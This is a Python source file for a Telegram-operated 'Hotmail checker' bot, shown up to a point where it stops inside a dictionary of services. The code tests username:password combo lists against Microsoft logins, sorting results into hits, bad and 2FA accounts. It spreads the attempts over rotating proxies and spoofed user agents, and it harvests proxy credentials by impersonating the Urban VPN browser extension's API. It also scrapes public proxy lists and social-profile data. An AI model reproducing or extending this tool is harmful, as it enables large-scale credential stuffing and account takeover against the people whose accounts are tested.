#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║     𝐇𝐨𝐭𝐦𝐚𝐢𝐥 𝐌𝐚𝐬𝐭𝐞𝐫 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭  —  MERGED v4.0         ║
║     Dev: {DEV_NAME}  |  Real DC-bot engine inside       ║
╚══════════════════════════════════════════════════════════╝
"""

import os, sys, json, time, random, re, threading, zipfile, io, tempfile, shutil, hashlib, base64, string, queue, subprocess, signal, atexit, inspect, uuid, warnings, html, urllib.parse
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import quote, unquote, urlparse

import requests

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich import box
    from rich.live import Live
    from rich.spinner import Spinner
    _rich = True
except ImportError:
    os.system(f"{sys.executable} -m pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich import box
    from rich.live import Live
    from rich.spinner import Spinner
    _rich = True

console = Console()

try:
    import httpx
except ImportError:
    os.system(f"{sys.executable} -m pip install httpx -q")
    import httpx

try:
    import telebot
    from telebot import types
except ImportError:
    os.system(f"{sys.executable} -m pip install pyTelegramBotAPI -q")
    import telebot
    from telebot import types

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system(f"{sys.executable} -m pip install beautifulsoup4 -q")
    from bs4 import BeautifulSoup

# ══════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════

_BASE = os.path.dirname(os.path.abspath(__file__))
_CONFIG_PATH = os.path.join(_BASE, "config.json")

try:
    with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
        _cfg = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    _cfg = {}

# Prefer Railway environment variables; fall back to config.json values.
BOT_TOKEN         = (os.getenv("bot_token") or os.getenv("BOT_TOKEN") or str(_cfg.get("bot_token", ""))).strip()
ADMIN_ID          = int((os.getenv("admin_id") or os.getenv("ADMIN_ID") or str(_cfg.get("admin_id", 0))).strip())
DEV_NAME          = str(_cfg.get("dev_name", "Vyom Agrwal"))
DEV_TAG           = f"Dev: {DEV_NAME}"
MASTER_THREADS    = int(_cfg.get("master_threads", 30))
INBOXER_THREADS   = int(_cfg.get("inboxer_threads", 30))
COOKIES_THREADS   = int(_cfg.get("cookies_threads", 30))
MAX_LINES         = int(_cfg.get("max_lines", 10000))
MAX_FILE_SIZE_MB  = int(_cfg.get("max_file_size_mb", 20))
PROXY_BATCH_INTERVAL      = int(_cfg.get("proxy_batch_interval", 1200))
PROXY_CLEAR_AFTER_BATCHES = int(_cfg.get("proxy_clear_after_batches", 1))
BACKUP_INTERVAL   = int(_cfg.get("backup_interval", 86400))
UA                = str(_cfg.get("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"))
MAX_RETRIES       = int(_cfg.get("max_retries", 3))
WEBSHARE_HOST     = str(_cfg.get("webshare_host", "p.webshare.io"))
WEBSHARE_PORT     = int(_cfg.get("webshare_port", 80))
WEBSHARE_USER     = str(_cfg.get("webshare_user", ""))
WEBSHARE_PASS     = str(_cfg.get("webshare_pass", ""))
WEBSHARE_COUNTRIES= list(_cfg.get("webshare_countries", ["us","gb","de","fr","nl","ca","au"]))
USER_AGENTS       = list(_cfg.get("user_agents", [UA]))
BUILTIN_PROXIES   = list(_cfg.get("builtin_proxies", []))

DB_FILE           = os.path.join(_BASE, "db.json")
PROXIES_FILE      = os.path.join(_BASE, "proxies.txt")
ADMIN_PROXIES_FILE= os.path.join(_BASE, "admin_proxies.txt")
COMBOS_FILE       = os.path.join(_BASE, "combos.txt")
HITS_FILE         = os.path.join(_BASE, "hits.txt")
BAD_FILE          = os.path.join(_BASE, "bad.txt")
LOG_FILE          = os.path.join(_BASE, "LOGS", "bot.log")
RESULTS_DIR       = os.path.join(_BASE, "results")
MAX_FILE_SIZE     = MAX_FILE_SIZE_MB * 1024 * 1024

# ══════════════════════════════════════════════════════════
#  EMOJIS & FORMATTING
# ══════════════════════════════════════════════════════════

E_CHECK = "\u2705"; E_CROSS = "\u274C"; E_FIRE  = "\U0001F525"; E_STAR  = "\u2B50"
E_LOCK  = "\U0001F512"; E_CHART = "\U0001F4CA"; E_FOLDER= "\U0001F4C1"; E_FILE  = "\U0001F4C4"
E_USER  = "\U0001F464"; E_CROWN = "\U0001F451"; E_GEAR  = "\u2699\uFE0F"; E_ROCKET= "\U0001F680"
E_GLOBE = "\U0001F30D"; E_SHIELD= "\U0001F6E1"; E_BELL  = "\U0001F514"; E_STOP  = "\U0001F6D1"
E_PLAY  = "\u25B6\uFE0F"; E_HOURGLASS = "\u23F3"; E_SPARKLE   = "\u2728"; E_DIAMOND   = "\U0001F48E"
E_HEART = "\u2764\uFE0F"; E_WAVE  = "\U0001F44B"; E_PARTY     = "\U0001F389"; E_ROBOT     = "\U0001F916"
E_MONEY = "\U0001F4B0"; E_GAME  = "\U0001F3AE"; E_MUSIC     = "\U0001F3B5"; E_WARN      = "\u26A0\uFE0F"
E_BAN   = "\U0001F6AB"; E_PIN   = "\U0001F4CC"; E_LINK      = "\U0001F517"; E_BOLT      = "\u26A1"
E_GIFT  = "\U0001F381"; E_KEY   = "\U0001F511"; E_MEMO      = "\U0001F4DD"; E_BOOM      = "\U0001F4A5"
E_CAMERA= "\U0001F4F7"; E_COOL  = "\U0001F60E"; E_THUMB     = "\U0001F44D"; E_EYES      = "\U0001F440"
E_CLOCK = "\U0001F552"; E_GREEN = "\U0001F7E2"; E_RED       = "\U0001F534"; E_YELLOW    = "\U0001F7E1"
E_BLUE  = "\U0001F535"; E_PURPLE= "\U0001F7E3"; E_ORANGE    = "\U0001F7E0"; E_UNLOCK    = "\U0001F513"

def mono(text):  return f"<code>{text}</code>"
def bold(text):  return f"<b>{text}</b>"
def italic(text):return f"<i>{text}</i>"
def uline(text): return f"<u>{text}</u>"
def link(text, url): return f'<a href="{url}">{text}</a>'
def pre(text):   return f"<pre>{text}</pre>"
def strike(text):return f"<s>{text}</s>"

def make_progress_bar(current, total, length=20):
    pct = current/total if total else 0
    filled = int(length*pct)
    bar = "\u2588"*filled + "\u2591"*(length-filled)
    return f"{bar} {pct*100:.1f}%"

def _bq(text): return f"<blockquote>{text}</blockquote>"

# ══════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════

active_checks = {}
active_checks_lock = threading.Lock()
BOT_START_TIME = 0.0
global_proxy_pool = []
global_proxy_pool_lock = threading.Lock()
bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None

# ══════════════════════════════════════════════════════════
#  LOGGER
# ══════════════════════════════════════════════════════════

_log_lock = threading.Lock()
MAX_LOG_SIZE = 5*1024*1024

def _ensure_log_dir():
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

def _rotate_log():
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        try: os.rename(LOG_FILE, os.path.join(os.path.dirname(LOG_FILE), f"bot_{ts}.log"))
        except: pass

def file_log(message: str, level: str="INFO"):
    _ensure_log_dir()
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] [{level}] {message}\n"
    with _log_lock:
        _rotate_log()
        try:
            with open(LOG_FILE, "a", encoding="utf-8", errors="replace") as f:
                f.write(line)
        except: pass

def log(msg, level="INFO"):
    file_log(msg, level)

def get_last_minutes(minutes: int=5) -> str:
    _ensure_log_dir()
    if not os.path.exists(LOG_FILE): return "No logs found."
    cutoff = time.time() - minutes*60
    lines=[]
    try:
        with open(LOG_FILE, "r", encoding="utf-8", errors="replace") as f:
            for raw in f:
                raw=raw.strip()
                if not raw: continue
                if raw.startswith("[") and len(raw)>20:
                    try:
                        ts = datetime.strptime(raw[1:20], "%Y-%m-%d %H:%M:%S").timestamp()
                        if ts>=cutoff: lines.append(raw)
                    except: lines.append(raw)
                else: lines.append(raw)
    except Exception as e: return f"Error reading logs: {e}"
    return "\n".join(lines) if lines else f"No logs in the last {minutes} minutes."

def _log(emoji, color, label, msg):
    ts = time.strftime("%H:%M:%S")
    console.print(f"[dim]{ts}[/dim]  [{color}]{emoji} {label}[/{color}]  {msg}")
    clean = re.sub(r'\[/?(bold|dim|yellow|green|red|cyan|magenta)[^\]]*\]', '', msg)
    file_log(f"{emoji} {label}: {clean}")

# ══════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════

db_lock = threading.Lock()

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except: pass
    return {"users":{}, "banned":{}, "approved":{}, "global_stats":{"total_checked":0,"total_hits":0,"total_lines_checked":0}}

def save_db(db):
    with db_lock:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, indent=2, ensure_ascii=False)

def get_user(db, uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "username":"", "full_name":"", "first_seen":datetime.now().isoformat(),
            "last_seen":datetime.now().isoformat(), "total_checked":0, "total_hits":0,
            "total_lines":0, "checks_count":0
        }
    db["users"][uid]["last_seen"] = datetime.now().isoformat()
    return db["users"][uid]

def update_user_info(db, user):
    u = get_user(db, user.id)
    u["username"] = user.username or u["username"]
    u["full_name"] = f"{user.first_name or ''} {user.last_name or ''}".strip() or u["full_name"]
    save_db(db)

def is_banned(db, uid):
    b = db.get("banned", {}).get(str(uid))
    if b:
        days = b.get("days")
        if days:
            dt = datetime.fromisoformat(b.get("date",""))
            if datetime.now() - dt < timedelta(days=days):
                return True, b.get("reason","No reason")
            else:
                del db["banned"][str(uid)]
                save_db(db)
                return False, None
        return True, b.get("reason","No reason")
    return False, None

def is_approved(db, uid):
    a = db.get("approved", {}).get(str(uid))
    if not a: return False
    days = a.get("days")
    if days:
        dt = datetime.fromisoformat(a.get("date",""))
        if datetime.now() - dt >= timedelta(days=days):
            del db["approved"][str(uid)]
            save_db(db)
            return False
    return True

# ══════════════════════════════════════════════════════════
#  PROXY MANAGEMENT
# ══════════════════════════════════════════════════════════

def load_proxies_from_file():
    proxies=[]
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE,"r",encoding="utf-8",errors="ignore") as f:
            for ln in f:
                ln=ln.strip()
                if ln: proxies.append(ln)
    return proxies

def load_admin_proxies():
    proxies=[]
    if os.path.exists(ADMIN_PROXIES_FILE):
        with open(ADMIN_PROXIES_FILE,"r",encoding="utf-8",errors="ignore") as f:
            for ln in f:
                ln=ln.strip()
                if ln: proxies.append(ln)
    return proxies

def save_proxies_to_file(proxy_list):
    with open(PROXIES_FILE,"w",encoding="utf-8") as f:
        for p in proxy_list: f.write(p+"\n")

def save_admin_proxies_to_file(proxy_list):
    with open(ADMIN_PROXIES_FILE,"w",encoding="utf-8") as f:
        for p in proxy_list: f.write(p+"\n")

def init_proxies():
    if not os.path.exists(PROXIES_FILE):
        save_proxies_to_file(BUILTIN_PROXIES)
    fetched = load_proxies_from_file()
    admin = load_admin_proxies()
    seen=set(); combined=[]
    for p in admin+fetched:
        if p not in seen:
            seen.add(p); combined.append(p)
    return combined

def update_global_proxy_pool():
    try:
        new = init_proxies()
        with global_proxy_pool_lock:
            global_proxy_pool[:] = new
        return len(new)
    except: return 0

class ProxyRotator:
    def __init__(self, plist=None, use=True):
        self.lock = threading.Lock()
        self.use = use
        self.proxies=[]; self.idx=0; self.fails={}; self.mf=6
        self.use_global_pool=False
        raw = plist or []
        if use and not raw:
            try:
                with global_proxy_pool_lock:
                    if global_proxy_pool:
                        raw = global_proxy_pool[:]
                        self.use_global_pool=True
                    else:
                        raw = BUILTIN_PROXIES[:]
            except:
                raw = BUILTIN_PROXIES[:]
        for r in raw:
            p=self._p(r.strip())
            if p: self.proxies.append(p)
        if self.proxies: random.shuffle(self.proxies)

    def _p(self, r):
        if not r: return None
        try:
            if r.count(":")==3 and "@" not in r:
                parts=r.split(":")
                h,po,u,pw=parts[0],parts[1],parts[2],parts[3]
                return {"http":f"http://{u}:{pw}@{h}:{po}","https":f"http://{u}:{pw}@{h}:{po}","_r":r}
            if "@" in r:
                return {"http":f"http://{r}","https":f"http://{r}","_r":r}
            if r.count(":")==1:
                return {"http":f"http://{r}","https":f"http://{r}","_r":r}
        except: pass
        return None

    def refresh_from_global_pool(self):
        if not self.use_global_pool: return False
        try:
            with global_proxy_pool_lock:
                if not global_proxy_pool: return False
                raw = global_proxy_pool[:]
            new=[]
            for r in raw:
                p=self._p(r.strip())
                if p: new.append(p)
            if new:
                with self.lock:
                    old=len(self.proxies)
                    if old>0:
                        rel=self.idx%old
                        self.idx=int((rel/old)*len(new))
                    else: self.idx=0
                    self.proxies=new
                    random.shuffle(self.proxies)
                    self.fails.clear()
                return True
        except: pass
        return False

    def get(self):
        if not self.use or not self.proxies: return None
        with self.lock:
            for _ in range(len(self.proxies)):
                p=self.proxies[self.idx%len(self.proxies)]
                self.idx+=1
                if self.fails.get(p["_r"],0)<self.mf:
                    return {"http":p["http"],"https":p["https"]}
            self.fails.clear()
            p=self.proxies[self.idx%len(self.proxies)]
            self.idx+=1
            return {"http":p["http"],"https":p["https"]}

    def ok(self, px):
        if not px: return
        with self.lock:
            for p in self.proxies:
                if p["http"]==px.get("http"):
                    self.fails[p["_r"]]=0; break

    def fail(self, px):
        if not px: return
        with self.lock:
            for p in self.proxies:
                if p["http"]==px.get("http"):
                    self.fails[p["_r"]]=self.fails.get(p["_r"],0)+1; break

    def total(self): return len(self.proxies)


def test_single_proxy(proxy_str):
    pr=ProxyRotator([proxy_str],True); px=pr.get()
    if not px: return False
    try:
        r=requests.get("https://httpbin.org/ip",proxies=px,timeout=10)
        return r.status_code==200
    except: return False

# ══════════════════════════════════════════════════════════
#  PROXY HUNTER — Urban VPN & public scraper
# ══════════════════════════════════════════════════════════

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
]

HEADERS_VPN = {
    "accept":"*/*","accept-language":"en-US,en;q=0.9","content-type":"application/json",
    "origin":"chrome-extension://eppiocemhmnlbhjplcgkofciegomcon",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
}
_CHROME_VERSIONS=[120,122,124,126,128,130,132,134,136,138,140,142,144]
_BROWSERS=["CHROME","EDGE","BRAVE"]
_PLATFORMS=["Windows NT 10.0; Win64; x64","Windows NT 11.0; Win64; x64","Macintosh; Intel Mac OS X 13_6","Macintosh; Intel Mac OS X 14_2","X11; Linux x86_64"]

def _random_headers():
    v=random.choice(_CHROME_VERSIONS); plat=random.choice(_PLATFORMS)
    ua=f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36"
    return {**HEADERS_VPN,"user-agent":ua}

def _httpx_proxy_kwargs(proxy_url:str)->dict:
    if not proxy_url: return {}
    try:
        ver=tuple(int(x) for x in httpx.__version__.split(".")[:2])
        if ver>=(0,23): return {"proxy":proxy_url}
        else: return {"proxies":{"http://":proxy_url,"https://":proxy_url}}
    except: return {"proxy":proxy_url}

def scrape_all():
    raw=[]
    for url in PROXY_SOURCES:
        try:
            r=requests.get(url,timeout=15,headers={"User-Agent":UA})
            if r.status_code==200:
                for line in r.text.splitlines():
                    line=line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        raw.append(line)
        except: pass
    return raw

def find_live_proxies(proxy_list, max_live=4, timeout=5, check_threads=300):
    alive=[]; lock=threading.Lock()
    def check_one(p):
        if len(alive)>=max_live: return
        try:
            proxies={"http":f"http://{p}","https":f"http://{p}"}
            r=requests.get("https://httpbin.org/ip",proxies=proxies,timeout=timeout)
            if r.status_code==200:
                with lock:
                    if len(alive)<max_live: alive.append(p)
        except: pass
    with ThreadPoolExecutor(max_workers=check_threads) as ex:
        futs=[ex.submit(check_one,p) for p in proxy_list]
        for f in as_completed(futs):
            if len(alive)>=max_live:
                ex.shutdown(wait=False,cancel_futures=True); break
    return alive

def _proxy_str_to_url(proxy_str:str)->Optional[str]:
    if not proxy_str: return None
    try:
        parts=proxy_str.strip().split(":")
        if len(parts)==4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if "@" in proxy_str: return f"http://{proxy_str}" if not proxy_str.startswith("http") else proxy_str
        if len(parts)==2: return f"http://{proxy_str}"
    except: pass
    return None

def _fetch_single_credential(client:httpx.Client, access_token:str, server:dict, country_code:str)->Optional[dict]:
    sig=server.get("signature")
    if not sig: return None
    headers_cred={**HEADERS_VPN,"authorization":f"Bearer {access_token}"}
    try:
        r=client.post("https://api-pro.falais.com/rest/v1/security/tokens/accs-proxy",
            json={"type":"accs-proxy","clientApp":{"name":"URBAN_VPN_BROWSER_EXTENSION"},"signature":sig},
            headers=headers_cred,timeout=15)
        r.raise_for_status()
        d=r.json()
        ip=server.get("address",{}).get("primary",{}).get("ip","")
        port=server.get("address",{}).get("primary",{}).get("port","")
        user=d["value"]; passwd=d["value"]
        if ip and port:
            return {"url":f"http://{user}:{passwd}@{ip}:{port}","ip":ip,"port":str(port),"user":user,"pass":passwd,"country":country_code}
    except: pass
    return None

def fetch_urban_vpn_proxies(progress_callback=None, auth_proxy:str=None)->List[dict]:
    new_proxies=[]; proxy_url=_proxy_str_to_url(auth_proxy) if auth_proxy else None
    try:
        auth_timeout=httpx.Timeout(connect=6,read=10,write=6,pool=5) if proxy_url else httpx.Timeout(30)
        auth_kwargs={"timeout":auth_timeout,"verify":False}
        if proxy_url: auth_kwargs.update(_httpx_proxy_kwargs(proxy_url))
        with httpx.Client(**auth_kwargs) as auth_client:
            hdrs=_random_headers(); browser=random.choice(_BROWSERS)
            if progress_callback: progress_callback("status","Getting anonymous token"+(f" via proxy..." if proxy_url else "..."))
            r=auth_client.post("https://api-pro.falais.com/rest/v1/registrations/clientApps/URBAN_VPN_BROWSER_EXTENSION/users/anonymous",
                json={"clientApp":{"name":"URBAN_VPN_BROWSER_EXTENSION","browser":browser}},headers=hdrs)
            r.raise_for_status(); anon_token=r.json()["value"]
            if progress_callback: progress_callback("status","Getting access token...")
            headers_auth={**hdrs,"authorization":f"Bearer {anon_token}"}
            r=auth_client.post("https://api-pro.falais.com/rest/v1/security/tokens/accs",
                json={"type":"accs","clientApp":{"name":"URBAN_VPN_BROWSER_EXTENSION"}},headers=headers_auth)
            r.raise_for_status(); access_token=r.json()["value"]
            if progress_callback: progress_callback("status","Fetching server list...")
            headers_countries={"accept":"application/json","accept-language":"en-US,en;q=0.9",
                "authorization":f"Bearer {access_token}","user-agent":hdrs["user-agent"],"x-client-app":"URBAN_VPN_BROWSER_EXTENSION"}
            r=auth_client.get("https://stats.falais.com/api/rest/v2/entrypoints/countries",headers=headers_countries)
            r.raise_for_status(); countries=r.json().get("countries",{}).get("elements",[])
        all_servers=[]
        for country in countries:
            cc=country.get("code",{}).get("iso2","??")
            for server in country.get("servers",{}).get("elements",[]):
                all_servers.append((server,cc))
        total_servers=len(all_servers)
        if progress_callback:
            progress_callback("total",total_servers)
            progress_callback("status",f"Fetching {total_servers} servers @ 50 threads...")
        fetched_lock=threading.Lock()
        progress_data={"done":0,"ok":0,"fail":0,"results":[]}
        cred_kwargs={"timeout":httpx.Timeout(connect=6,read=15,write=6,pool=5),"verify":False}
        if proxy_url: cred_kwargs.update(_httpx_proxy_kwargs(proxy_url))
        with httpx.Client(**cred_kwargs) as cred_client:
            def fetch_one(args):
                server,cc=args
                result=_fetch_single_credential(cred_client,access_token,server,cc)
                with fetched_lock:
                    progress_data["done"]+=1
                    if result: progress_data["ok"]+=1; progress_data["results"].append(result)
                    else: progress_data["fail"]+=1
                    if progress_callback:
                        progress_callback("progress",progress_data["done"],total_servers,progress_data["ok"],progress_data["fail"])
                return result
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures=[executor.submit(fetch_one,s) for s in all_servers]
                for future in as_completed(futures): pass
        new_proxies=progress_data["results"]
        if progress_callback: progress_callback("complete",len(new_proxies),total_servers,progress_data["ok"],progress_data["fail"])
    except Exception as e:
        if progress_callback: progress_callback("error",str(e))
        return []
    return new_proxies

def proxies_to_str_list(proxies:List[dict])->List[str]:
    return [f"{p['ip']}:{p['port']}:{p['user']}:{p['pass']}" for p in proxies]

def get_country_summary(proxies:List[dict])->dict:
    cc={}
    for p in proxies:
        c=p.get("country","??")
        cc[c]=cc.get(c,0)+1
    return cc

# ══════════════════════════════════════════════════════════
#  SOCIAL PROFILE HELPERS
# ══════════════════════════════════════════════════════════

_UA_LIST = [
    "Outlook-Android/2.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

def _get_ua() -> str:
    return random.choice(_UA_LIST)

def _xor_encode(text):
    key="webapp1.0+202106"
    return ''.join(chr(ord(c)^ord(key[i%len(key)])) for i,c in enumerate(text))

def _get_followers_range(count):
    try:
        count = int(count)
        if count < 1000: return '0-999'
        elif count < 10000:
            k = count // 1000
            return f'{k}k-{k}.9k'
        elif count < 100000: return '10k-99k'
        elif count < 1000000:
            h = count // 100000
            return f'{h}00k-{h+1}00k'
        else: return '1m+'
    except: return '0-999'

def _calculate_account_age(create_timestamp):
    try:
        if create_timestamp and create_timestamp>0:
            created=datetime.fromtimestamp(create_timestamp)
            age=datetime.now()-created
            years=age.days//365; months=(age.days%365)//30
            if years>0: return f"{years} year(s) {months} month(s)"
            elif months>0: return f"{months} month(s)"
    except: pass
    return "Unknown"

def _get_tiktok_profile(sess, username, email=None):
    headers={"User-Agent":_get_ua(),"Accept":"application/json, text/plain, */*","Referer":"https://www.tiktok.com/"}
    try:
        r=requests.get(f"https://www.tiktok.com/api/user/detail/?uniqueId={username}",headers=headers,timeout=10)
        if r.status_code==200:
            d=r.json(); ui=d.get("userInfo",{}); user=ui.get("user",{}); stats=ui.get("stats",{})
            return {"username":user.get("uniqueId",""),"nickname":user.get("nickname",""),
                    "followers":stats.get("followerCount",0),"following":stats.get("followingCount",0),
                    "likes":stats.get("heartCount",0),"videos":stats.get("videoCount",0),
                    "verified":user.get("verified",False),"id":user.get("id",""),
                    "bio":user.get("signature",""),"private":user.get("privateAccount",False),
                    "region":user.get("region","Unknown")}
    except: pass
    return None

def _get_tiktok_profile_web(username):
    headers={"User-Agent":_get_ua(),"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    try:
        r=requests.get(f"https://www.tiktok.com/@{username}",headers=headers,timeout=10)
        if r.status_code==200:
            html_text=r.text
            m=re.search(r'<script[^>]*id="__UNIVERSAL_DATA_FOR_REHYDRATION__"[^>]*>([^<]+)</script>',html_text)
            if m:
                data=json.loads(m.group(1))
                ud=data.get("__DEFAULT_SCOPE__",{}).get("webapp.user-detail",{}).get("userInfo",{})
                if ud:
                    user=ud.get("user",{}); stats=ud.get("stats",{})
                    return {"username":user.get("uniqueId",""),"nickname":user.get("nickname",""),
                            "followers":stats.get("followerCount",0),"following":stats.get("followingCount",0),
                            "likes":stats.get("heartCount",0),"videos":stats.get("videoCount",0),
                            "verified":user.get("verified",False)}
    except: pass
    return None

def _get_instagram_profile(username):
    headers={"User-Agent":_get_ua(),"Accept":"*/*","Accept-Language":"en-US,en;q=0.9"}
    try:
        r=requests.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",headers=headers,timeout=10)
        if r.status_code==200:
            d=r.json()
            if d.get("data") and d["data"].get("user"):
                u=d["data"]["user"]
                return {"username":u.get("username",""),
                        "followers":u.get("edge_followed_by",{}).get("count",0),
                        "following":u.get("edge_follow",{}).get("count",0),
                        "posts":u.get("edge_owner_to_timeline_media",{}).get("count",0),
                        "verified":u.get("is_verified",False),"private":u.get("is_private",False),
                        "bio":u.get("biography",""),"profile_pic":u.get("profile_pic_url",""),
                        "user_id":u.get("id",""),"professional":u.get("is_business_account",False),
                        "category":u.get("category_name","N/A"),"full_name":u.get("full_name","N/A")}
    except: pass
    return None

# ══════════════════════════════════════════════════════════
#  MS ENGINE HELPERS
# ══════════════════════════════════════════════════════════

PROXY_EXC=(requests.exceptions.ProxyError,requests.exceptions.Timeout,requests.exceptions.SSLError,requests.exceptions.ConnectionError)

SKIP_RE=[
    re.compile(r'^\s*[\u2514\u251C\u2500\u2550\u2554\u255A\u2551\u2557\u255D\u2560\u2563\u2510\u2518\u250C\u252C\u2534\u253C\u2502]'),
    re.compile(r'^\s*\[(?:ACTIVE|PERPETUAL|INFO)\]', re.I),
    re.compile(r'^\s*Generated:', re.I),
    re.compile(r'^\s*Total\s+Hits:', re.I),
    re.compile(r'^\s*={3,}'),
    re.compile(r'^\s*-{3,}'),
    re.compile(r'^\s*#'),
]
EM_RE=re.compile(r'([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})')
DISC_RE=re.compile(r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',re.I)
XCODE_RE=re.compile(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}')

def _clean(url):
    if not url: return url
    return url.replace("&amp;","&").replace("&#x3a;",":").replace("&#x2f;","/")

def _dosubmit(t):
    return "DoSubmit" in t or "document.fmHF.submit" in t or ('onload="' in t and 'submit()' in t.lower())

def _form_sub(sess, resp, hops=10):
    c=resp
    for _ in range(hops):
        if not _dosubmit(c.text): break
        am=re.search(r'<form[^>]*action="([^"]+)"',c.text,re.I)
        if not am: break
        act=_clean(am.group(1)); fd={}
        for n,v in re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"',c.text): fd[n]=_clean(v)
        for v,n in re.findall(r'<input[^>]*value="([^"]*)"[^>]*name="([^"]*)"',c.text):
            if n not in fd: fd[n]=_clean(v)
        mm=re.search(r'<form[^>]*method="([^"]+)"',c.text,re.I)
        meth=mm.group(1).upper() if mm else "POST"
        h={"User-Agent":UA,"Content-Type":"application/x-www-form-urlencoded","Accept":"text/html,*/*","Referer":c.url}
        if meth=="GET": c=sess.get(act,params=fd,headers=h,allow_redirects=True,timeout=15)
        else: c=sess.post(act,data=fd,headers=h,allow_redirects=True,timeout=15)
    return c

def _issue(url, text=""):
    c=(_clean(url)+" "+text).lower() if url else text.lower()
    if "account.live.com/recover" in c: return "2FA"
    if "account.live.com/abuse" in c or "/abuse?mkt=" in c: return "2FA"
    if "identity/confirm" in c: return "2FA"
    if "account or password is incorrect" in c or "that password is incorrect" in c: return "BAD"
    if "account doesn" in c: return "BAD"
    if "account has been locked" in c or "account has been suspended" in c: return "2FA"
    if "cancel?mkt=" in c: return "2FA"
    return None

def _follow(sess, resp, hops=12):
    c=resp; bh={"User-Agent":UA,"Accept":"text/html,*/*"}
    for _ in range(hops):
        iss=_issue(c.url,c.text)
        if iss: return c
        if _dosubmit(c.text): c=_form_sub(sess,c); continue
        m=re.search(r'<meta[^>]*http-equiv="refresh"[^>]*content="[^;]*;\s*([^"]+)"',c.text,re.I)
        if m:
            bh["Referer"]=c.url
            try: c=sess.get(_clean(m.group(1).strip()),headers=bh,allow_redirects=True,timeout=15)
            except: break
            continue
        found=False
        for p in [r'window\.location\.replace\("([^"]+)"\)',r'window\.location\.href\s*=\s*"([^"]+)"']:
            m2=re.search(p,c.text)
            if m2:
                bh["Referer"]=c.url
                try: c=sess.get(_clean(m2.group(1)),headers=bh,allow_redirects=True,timeout=15)
                except: pass
                found=True; break
        if not found: break
    return c

# ══════════════════════════════════════════════════════════
#  SERVICES DICT (200+) + SETS + SERVICE HELPERS
# ══════════════════════════════════════════════════════════

SERVICES_ALL = {
    "Facebook":["facebookmail.com","facebook.com"],
    "Instagram":["mail.instagram.com","instagram.com"],
    "TikTok":["account.tiktok.com","tiktok.com"],
    "Twitter/X":["x.com","twitter.com"],
    "LinkedIn":["linkedin.com"],
    "Snapchat":["snapchat.com"],
    "Discord":["discord.com"],
    "Telegram":["telegram.org"],
    "WhatsApp":["whatsapp.com"],
    "Pinterest":["pinterest.com"],
    "Reddit":["reddit.com"],
